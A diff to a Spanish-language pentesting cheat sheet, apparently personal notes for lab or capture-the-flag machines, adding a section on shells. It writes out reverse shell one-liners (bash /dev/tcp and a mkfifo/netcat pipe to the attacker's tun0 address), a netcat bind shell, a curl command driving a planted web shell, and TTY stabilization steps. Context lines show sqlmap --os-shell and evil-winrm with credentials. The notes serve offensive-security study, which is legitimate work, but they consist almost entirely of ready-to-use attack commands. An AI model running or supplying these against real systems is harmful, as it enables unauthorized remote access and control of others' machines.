@@ -65,13 +65,24 @@ sqlmap -u '<url>?p=x' --cookie="PHPSESSID=<v>" --os-shell   # depende de privile
 ## 4. Shell + estabilización
 
 ```bash
-bash -c 'bash -i >& /dev/tcp/<IP_tun0>/<puerto> 0>&1'    # IP = tun0 propia, NO víctima
-nc -lvnp <puerto>
-# Estabilizar (orden estricto):
+# Reverse Shell (Linux)
+nc -lvnp <puerto>                                        # listener atacante (IP = tun0)
+bash -c 'bash -i >& /dev/tcp/<IP_tun0>/<puerto> 0>&1'    # bash /dev/tcp
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_tun0> <puerto> >/tmp/f # FIFO netcat
+
+# Bind Shell (Linux)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <puerto> >/tmp/f # víctima
+nc <IP_victima> <puerto>                                 # atacante conecta
+
+# Web Shell (interacción por CLI)
+curl -s -G "http://<IP>/shell.php" --data-urlencode "cmd=id"
+
+# Estabilizar TTY (orden estricto):
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 # Ctrl+Z
-stty raw -echo; fg
-export TERM=xterm
+stty raw -echo; fg                                       # pulsar Enter dos veces
+export TERM=xterm-256color
+stty rows <filas> columns <columnas>                     # stty size en terminal local
 ```
 
 ---
@@ -109,3 +120,4 @@ evil-winrm -i <IP> -u <user> -p <pass>                      # WinRM con creds
 - [[00_Index]] — estado de máquinas y base de técnicas
 - [[Cheatsheets/Command Basics Tmux|Tmux]]
 - [[Técnicas/2_Enumeración/SNMP_Enumeration|SNMP Enumeration]]
+- [[Técnicas/3_Explotación/Shells-Reverse-Bind-Web|Tipos de Shells y Estabilización]]
